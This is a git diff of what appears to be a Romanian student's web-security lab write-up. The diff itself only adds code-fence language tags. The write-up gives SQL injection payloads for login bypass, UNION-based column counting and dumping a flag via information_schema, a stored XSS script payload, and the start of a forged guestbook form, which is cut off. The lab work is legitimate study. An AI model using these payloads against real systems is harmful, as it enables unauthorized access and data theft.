@@ -6,42 +6,42 @@ Grupa: 341 C2
 	Cerinta 1
 
  Serverul ruleaza direct un query. Cu urmatorul SQL injection (cu stringurile date la login):
-```
+```SQL
  SELECT * FROM tabela WHERE username=<user> AND PASSWORD=<passwd> LIMIT 	1
 ```
-```
+```SQL
  SELECT * FROM tabela WHERE username='' OR 1=1 -- ' AND PASSWORD=<passwd>
 ```
 Comment:  username este string care se evalueaza la true: 
-	```
+	```SQL
 	' ' OR 1=1 -- ' fac ca restul comenzii, pana la ' sa fie comentat
 	```
 
 	Cerinta 2
 	
-```
+```SQL
  SELECT col1, col2... FROM tablename WHERE name='' UNION (SELECT 1, 2, ...)  -- bruteforce the number of columns! '
 ```
 
  1. Incercam sa ne logam cu:
-```
+```SQL
   ' or 1 order by 1,2,3,4,5,6,7,8,9,10 -- x
 ```
  - se observa eroarea la coloana 5 => avem 4 coloane
 
  2. Ne logam cu:
- ```
+ ```SQL
   ' union select 1, 2, 3, group_concat(table_name separator ',') from information_schema.tables where table_schema='guestbook' -- x
   ```
  - se observa ca avem tabelele: entries, flags, users
 
  3. Aflam care e coloana cu flag-ul:
- ```
+ ```SQL
  ' union select 1, 2, 3, group_concat(column_name separator ',') from information_schema.columns where table_schema='guestbook' and table_name='flags' -- x
  ```
 
  4. Selectam flagul din tabela.
- ```
+ ```SQL
  ' union select 1, 2, 3, flag from guestbook.flags -- x
  ```
 
@@ -52,7 +52,7 @@ Comment:  username este string care se evalueaza la true:
  Mesajele scrise in chenarul din server sunt interpretate ca HTML. 
  Orice script e bagat in HTML si executat. Asadar, mesajul contine:
  
-```
+```json
  <script>
  alert("Arafat!");
  </script> 
@@ -62,7 +62,7 @@ Comment:  username este string care se evalueaza la true:
 	Cerinta 4
 
  Form al guestbook-ului:
- ```
+ ```json
 <form method="post" action="/guestbook/post">
   <p>
     <div><label for="message">Message:</label></div>
@@ -75,7 +75,7 @@ Comment:  username este string care se evalueaza la true:
 ```
 
  L-am refactorizat local:
- ```
+ ```json
 <form method="post" action="http://localhost:8080/guestbook/post">
   <p>
     <label>Boss:</label>
